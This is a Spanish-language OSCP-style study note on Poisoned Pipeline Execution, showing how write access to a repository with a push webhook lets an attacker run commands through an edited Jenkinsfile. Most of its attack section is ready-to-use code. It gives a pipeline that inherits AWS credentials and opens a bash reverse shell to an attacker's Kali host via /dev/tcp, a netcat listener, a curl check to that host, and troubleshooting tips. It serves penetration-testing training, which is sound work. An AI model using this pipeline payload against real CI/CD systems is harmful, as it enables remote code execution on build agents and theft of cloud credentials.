---
tipo: tecnica
fase: explotacion
so: cloud
tags: [oscp, tecnica, explotacion, cicd, cloud]
fecha: 2026-10-09
---

# Poisoned Pipeline Execution (Jenkinsfile)

> [!abstract] Qué es y cuándo usarla
> Si se obtiene acceso de escritura a un repositorio cuyo pipeline (ej. `Jenkinsfile` de Jenkins) se dispara automáticamente mediante un webhook al hacer `git push`, se puede editar ese fichero para inyectar comandos arbitrarios. El pipeline los ejecuta con los privilegios y credenciales (ej. claves AWS inyectadas vía `withAWS`) que tenga configurados, dando ejecución de código en el agente/builder sin necesidad de explotar ninguna vulnerabilidad del propio Jenkins.

## Requisitos previos
- Acceso de escritura al repositorio del SCM (ej. credenciales de Gitea/GitLab/GitHub robadas).
- Un webhook configurado en el repo que dispare el pipeline al hacer push (comprobable en Settings → Webhooks).
- Listener preparado en Kali antes de hacer el commit/push.

## Pasos
```groovy
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                withAWS(region: 'us-east-1', credentials: 'aws_key') {   // opcional: hereda credenciales del pipeline
                    script {
                        if (isUnix()) {
                            sh 'bash -c "bash -i >& /dev/tcp/<IP_kali>/<puerto> 0>&1" & '
                        }
                    }
                }
            }
        }
    }
}
```
```bash
nc -nvlp <puerto>          # listener en Kali ANTES de hacer el commit/push
```
Editar el `Jenkinsfile` desde la interfaz del SCM (botón Edit) y hacer commit/push — el webhook dispara el pipeline automáticamente.

> [!warning] Detección / problemas
> - Probar primero con algo inofensivo (`sh 'curl http://<IP_kali>/'`) y confirmar en logs (`access.log`) que el pipeline ejecuta el código, antes de arriesgar el payload final.
> - No intentar ejecutar comandos de sistema directamente en Groovy dentro de `script{}` sin pasar por `sh` — Jenkins ejecuta ese Groovy en un sandbox con acceso restringido a APIs internas (`script-approval`).
> - Comprobar `isUnix()` antes de usar `sh`, o el pipeline puede fallar si el agente es Windows.
> - El pipeline puede tardar unos minutos en dispararse tras el push — no asumir fallo inmediatamente.

## Visto en
- Módulo: [[26 - Attacking AWS Cloud Infrastructure]]
- Relacionado: [[Ataque de Cadena de Dependencias (Dependency Confusion)]]
- Máquinas: [[]]
